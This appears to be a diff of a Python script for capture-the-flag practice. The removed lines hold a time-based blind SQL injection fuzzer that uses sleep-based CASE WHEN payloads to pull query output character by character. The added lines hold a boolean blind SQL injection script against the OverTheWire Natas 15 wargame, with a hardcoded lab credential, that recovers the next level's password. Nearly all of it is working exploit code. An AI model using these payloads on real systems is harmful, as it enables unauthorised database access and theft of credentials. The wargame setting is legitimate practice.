@@ -1,52 +1,23 @@
 import requests
-import sys
-import time
-## CTF (Blind SQL TableName/Column Name Fuzz Script)
 
-if len(sys.argv) == 1:
- print '''
-Usage : python sql.py "QUERY"
-Example : python sql.py "(select database)"
- '''
- sys.exit()
-query=sys.argv[1]
-print "[*] Obtaining length"
-url = "https:/localhost.com:8082/sub"
-headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
- "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-"Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
-"Cookie": 'xxxxxxxxxxxxxxxxxxx',
-"Host": "localhost",
-"Connection": "close",
-"X-Requested-With":"XMLHttpRequest",
-"Content-Type": "application/x-www-form-urlencoded"}
-for i in range(1,100):
- current_time=time.time()
- data={"methods[]": "on-site", "urls[]": "jnkfooo'-cast((select CASE WHEN ((select length("+query+"))="+str(i)+") THEN (sleep(1)) ELSE 2 END) as char)-'"}
- response=requests.post(url, headers=headers, data=data).text
- response_time=time.time()
- time_taken=response_time-current_time
- print "Executing jnkfooo'-cast((select CASE WHEN ((select length("+query+"))="+str(i)+") THEN (sleep(1)) ELSE 2 END) as char)-'"+" took "+str(time_taken)
- if time_taken > 2:
-  print "[+] Length of DB query output is : "+str(i)
-  length=i+1
-  break
- i=i+1
-print "[*] obtaining query output\n"
-outp=''
-#Obtaining query output
-charset="abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-."
-for i in range(1,length):
- for char in charset:
-  current_time=time.time()
-  data={"methods[]": "on-site", "urls[]": "jnkfooo'-cast((select CASE WHEN ("+query+" like '"+outp+char+"%') THEN (sleep(1)) ELSE 2 END) as char)-'"}
-  response=requests.post(url, headers=headers, data=data).text
-  response_time=time.time()
-  time_taken=response_time-current_time
-  print "Executing jnkfooo'-cast((select CASE WHEN ("+query+" like '"+outp+char+"%') THEN (sleep(1)) ELSE 2 END) as char)-' took "+str(time_taken)
-  if time_taken > 2:
-   print "Got '"+char+"'"
-   outp=outp+char
-   break
- i=i+1
-print "QUERY output : "+outp
+chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+password=""
+target='http://natas15.natas.labs.overthewire.org/index.php?username=natas16"'
+exist=""
+
+for x in chars:
+    print (target+'AND password LIKE BINARY "%'+x+'%" "')
+    r = requests.get( target+'AND password LIKE BINARY "%'+x+'%" "', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
+    response =r.text
+    if("This user exists" in response):
+        #print ("Found letter" ,x)
+        exist+=x
+print (exist)
+
+for i in range (0,32):
+        for char in exist:
+                r = requests.get( target+'AND password LIKE BINARY "'+password+char+'%" "', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
+                response =r.text
+                if 'exists' in response:
+                        password =password+char
+                        print (password)
